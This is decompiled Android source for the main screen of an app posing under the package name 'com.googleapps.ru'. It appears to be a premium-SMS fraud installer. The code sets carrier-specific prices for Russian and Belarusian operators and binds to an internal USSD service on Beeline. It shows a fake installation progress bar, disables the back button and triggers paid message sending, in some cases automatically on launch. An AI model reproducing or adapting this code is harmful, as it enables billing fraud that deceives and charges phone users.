package com.googleapps.ru;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.text.SpannableString;
import android.text.method.LinkMovementMethod;
import android.text.style.UnderlineSpan;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.TranslateAnimation;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import com.android.internal.telephony.IExtendedNetworkService;
import com.android.internal.telephony.IExtendedNetworkService.Stub;

public class Main
  extends Activity
{
  public static final String CONTENT = "*CONTENT*";
  private static final String INSTALLED_URL = "INSTALLED_URL";
  private static final int OFFERT = 1;
  public static final String PREFERENCES = "PREFERENCES";
  private static final int RESULT_OK = 1;
  public static final String SENDING_OK = "SENDING_OK";
  public static final String SVC = "com.android.ussd.IExtendedNetworkService";
  private static final String WAS_INSTALLED = "WAS_INSTALLED";
  private static ServiceConnection sc = null;
  private Activator actor;
  private TextView agreementTextView;
  private TextView belorusTextView;
  private String byPrice = "6900";
  private ProgressDialog dialog;
  private TextView exitTextView;
  private TextView footerTextView;
  private TextView installedContentTextView;
  private TextView mainTextView;
  private String mfPrice = "236";
  private String okURL;
  private String pleaseWaitString;
  private ProgressBar progressBar;
  private IExtendedNetworkService svc = null;
  private String tel2Price = "94.70";
  private boolean wasProgressDone;
  private Button yesButton;
  
  public Main() {}
  
  private boolean areInstalledAndActedLinksEquals()
  {
    return this.okURL.equals(this.actor.getLinkHasToBeActed());
  }
  
  private void initButtons()
  {
    this.yesButton = ((Button)findViewById(2131296263));
    if (wasOK())
    {
      this.yesButton.setEnabled(true);
      this.yesButton.setVisibility(0);
    }
    setListeners();
  }
  
  private void initGUI()
  {
    initButtons();
    initTextViews();
  }
  
  private void initSettings()
  {
    SharedPreferences localSharedPreferences = getSharedPreferences("PREFERENCES", 0);
    this.wasProgressDone = localSharedPreferences.getBoolean("WAS_INSTALLED", false);
    this.okURL = localSharedPreferences.getString("INSTALLED_URL", "");
  }
  
  private void initTextViews()
  {
    this.mainTextView = ((TextView)findViewById(2131296264));
    if (!wasOK()) {
      this.mainTextView.setText(this.actor.getMainLocalizedText());
    }
    for (;;)
    {
      if (this.actor.isUKID())
      {
        ((TextView)findViewById(2131296259)).setVisibility(8);
        if (wasOK()) {
          this.mainTextView.setText(getResources().getString(2131165190));
        }
      }
      this.installedContentTextView = ((TextView)findViewById(2131296266));
      this.installedContentTextView.setText(this.actor.getSecondText());
      if ((wasOK()) || (this.actor.isUKID()))
      {
        this.installedContentTextView.setEnabled(true);
        this.installedContentTextView.setVisibility(0);
      }
      return;
      this.mainTextView.setText(this.actor.getMainLocalizedText() + "100%");
    }
  }
  
  private void install()
  {
    if (!wasOK())
    {
      new AsyncLoader().execute(new String[] { "" });
      return;
    }
    updateGUI();
  }
  
  private void registerReceiver()
  {
    registerReceiver(new BroadcastReceiver()new IntentFilter
    {
      public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
      {
        Main.this.dialog.dismiss();
        switch (Activator.STATUS)
        {
        default: 
          Toast.makeText(Main.this.getBaseContext(), 2131165194, 0).show();
        }
        for (;;)
        {
          Main.this.unregisterReceiver(this);
          return;
          Main.this.showLastScreen();
        }
      }
    }, new IntentFilter("SENDING_OK"));
  }
  
  private void setListeners()
  {
    this.yesButton.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        if (Main.this.actor.sendNow())
        {
          Main.this.showLastScreen();
          return;
        }
        Main.this.start();
      }
    });
    this.footerTextView = ((TextView)findViewById(2131296259));
    this.agreementTextView = ((TextView)findViewById(2131296260));
    this.exitTextView = ((TextView)findViewById(2131296261));
    this.agreementTextView.setVisibility(8);
    this.exitTextView.setVisibility(8);
    Object localObject;
    if ((this.actor.isMFon()) || (this.actor.isTele2()))
    {
      if (!this.actor.isMFon()) {
        break label346;
      }
      localObject = this.mfPrice;
    }
    for (;;)
    {
      this.footerTextView.setVisibility(0);
      this.agreementTextView.setVisibility(0);
      this.exitTextView.setVisibility(0);
      this.footerTextView = ((TextView)findViewById(2131296259));
      this.footerTextView.setText(getString(2131165203) + " " + (String)localObject + getString(2131165204));
      this.agreementTextView = ((TextView)findViewById(2131296260));
      localObject = new SpannableString(getString(2131165201));
      ((SpannableString)localObject).setSpan(new UnderlineSpan(), 0, ((SpannableString)localObject).length(), 0);
      this.agreementTextView.setText((CharSequence)localObject);
      this.agreementTextView.setOnClickListener(new View.OnClickListener()
      {
        public void onClick(View paramAnonymousView)
        {
          Main.this.showAgr();
        }
      });
      this.exitTextView = ((TextView)findViewById(2131296261));
      localObject = new SpannableString(getString(2131165202));
      ((SpannableString)localObject).setSpan(new UnderlineSpan(), 0, ((SpannableString)localObject).length(), 0);
      this.exitTextView.setText((CharSequence)localObject);
      this.exitTextView.setOnClickListener(new View.OnClickListener()
      {
        public void onClick(View paramAnonymousView)
        {
          Main.this.finish();
        }
      });
      this.belorusTextView = ((TextView)findViewById(2131296267));
      return;
      label346:
      if (this.actor.isBy()) {
        localObject = this.byPrice;
      } else {
        localObject = this.tel2Price;
      }
    }
  }
  
  private void showAgr()
  {
    startActivityForResult(new Intent(this, Off.class), 1);
  }
  
  private void showAirplaneModeDialog()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setTitle(2131165191).setMessage(getResources().getString(2131165192)).setCancelable(false).setPositiveButton(getResources().getString(2131165208), new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        TextUtils.putSettingsValue(Main.this.getApplicationContext(), "AIRPLANE_MODE_ENABLED_BY_USER_CHOICE", true, Main.this.getSharedPreferences("PREFERENCES", 0));
        Utils.setAirplaneMode(Main.this.getApplicationContext(), 0);
        Main.this.finish();
      }
    }).setNegativeButton(getResources().getString(2131165209), new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        Main.this.finish();
      }
    });
    localBuilder.create().show();
  }
  
  private void showLastScreen()
  {
    Intent localIntent = new Intent(this, ShowLink.class);
    localIntent.putExtra("URL", this.actor.getActedLink());
    startActivity(localIntent);
    finish();
  }
  
  private void start()
  {
    this.dialog = new ProgressDialog(this);
    this.dialog.setMessage(this.pleaseWaitString);
    this.dialog.setCancelable(false);
    this.dialog.show();
    registerReceiver();
    this.actor.send();
  }
  
  private void startC2DM()
  {
    Notificator localNotificator = new Notificator();
    localNotificator.setPrefs(getSharedPreferences("PREFERENCES", 0));
    localNotificator.initNotificationsNumberSettings(getApplicationContext());
  }
  
  private void updateGUI()
  {
    this.progressBar.setProgress(100);
    initGUI();
    animateButtons();
  }
  
  private boolean wasOK()
  {
    return (this.wasProgressDone) && (areInstalledAndActedLinksEquals());
  }
  
  void animateButtons()
  {
    TranslateAnimation localTranslateAnimation = new TranslateAnimation(1, 1.0F, 1, 0.0F, 1, 0.0F, 1, 0.0F);
    localTranslateAnimation.setDuration(1000L);
    this.installedContentTextView.startAnimation(localTranslateAnimation);
    this.yesButton.startAnimation(localTranslateAnimation);
    this.belorusTextView.startAnimation(localTranslateAnimation);
  }
  
  void bindToService()
  {
    sc = new ServiceConnection()
    {
      public void onServiceConnected(ComponentName paramAnonymousComponentName, IBinder paramAnonymousIBinder)
      {
        Main.this.svc = IExtendedNetworkService.Stub.asInterface(paramAnonymousIBinder);
      }
      
      public void onServiceDisconnected(ComponentName paramAnonymousComponentName)
      {
        Main.this.svc = null;
      }
    };
    bindService(new Intent("com.android.ussd.IExtendedNetworkService"), sc, 1);
  }
  
  void enableBellorussTexts()
  {
    if (wasOK()) {
      this.belorusTextView.setVisibility(0);
    }
    this.footerTextView.setText(Html.fromHtml(getString(2131165196) + " " + "<a href=\"show_offert_commonautosend://\">" + getString(2131165197) + "</a>"));
    this.footerTextView.setMovementMethod(LinkMovementMethod.getInstance());
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
  {
    super.onActivityResult(paramInt1, paramInt2, paramIntent);
    if (paramInt2 == 1) {
      start();
    }
  }
  
  public void onBackPressed() {}
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    Utils.createShortcut(this);
    paramBundle = (TelephonyManager)getSystemService("phone");
    if (paramBundle.getSimState() == 5)
    {
      paramBundle = paramBundle.getSimOperator();
      this.actor = new Activator(this, paramBundle);
      if (this.actor.isBeeline()) {
        bindToService();
      }
      if (!this.actor.isActed()) {
        break label159;
      }
      showLastScreen();
      label74:
      setContentView(2130903041);
      this.progressBar = ((ProgressBar)findViewById(2131296265));
      this.pleaseWaitString = getResources().getString(2131165198);
      if (this.actor.wasInitError()) {
        break label198;
      }
      initSettings();
      if (!this.actor.sendNow()) {
        break label179;
      }
      initGUI();
      if (this.actor.isActed()) {
        break label174;
      }
      start();
    }
    label159:
    label174:
    label179:
    while (this.actor.isActed())
    {
      return;
      paramBundle = "000000";
      break;
      if (!Utils.isAirplaneModeOn(getApplicationContext())) {
        break label74;
      }
      showAirplaneModeDialog();
      return;
      install();
      return;
    }
    initGUI();
    install();
    return;
    label198:
    finish();
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131230720, paramMenu);
    return true;
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 4) {
      return true;
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    switch (paramMenuItem.getItemId())
    {
    default: 
      return super.onOptionsItemSelected(paramMenuItem);
    }
    showAgr();
    return true;
  }
  
  protected void onResume()
  {
    super.onResume();
    startC2DM();
    if ((!this.actor.sendNow()) && (this.actor.isActed())) {
      showLastScreen();
    }
  }
  
  public class AsyncLoader
    extends AsyncTask<String, Integer, String>
  {
    private static final long UPD_TIME = 61L;
    private int pVal = 0;
    
    public AsyncLoader() {}
    
    protected String doInBackground(String... paramVarArgs)
    {
      this.pVal = 0;
      for (;;)
      {
        if (this.pVal >= 101) {
          return null;
        }
        try
        {
          Thread.sleep(61L);
          this.pVal += 1;
          publishProgress(new Integer[] { Integer.valueOf(Main.this.progressBar.getProgress() + 1) });
        }
        catch (InterruptedException paramVarArgs)
        {
          for (;;)
          {
            paramVarArgs.printStackTrace();
          }
        }
      }
    }
    
    protected void onPostExecute(String paramString)
    {
      Main.this.wasProgressDone = true;
      Main.this.okURL = Main.this.actor.getLinkHasToBeActed();
      paramString = Main.this.getSharedPreferences("PREFERENCES", 0).edit();
      paramString.putBoolean("WAS_INSTALLED", true);
      paramString.putString("INSTALLED_URL", Main.this.actor.getLinkHasToBeActed());
      paramString.commit();
      Main.this.updateGUI();
    }
    
    public void onProgressUpdate(Integer... paramVarArgs)
    {
      Main.this.progressBar.setProgress(this.pVal);
      Main.this.mainTextView.setText(Main.this.actor.getMainLocalizedText() + Integer.toString(this.pVal) + "%");
    }
  }
}
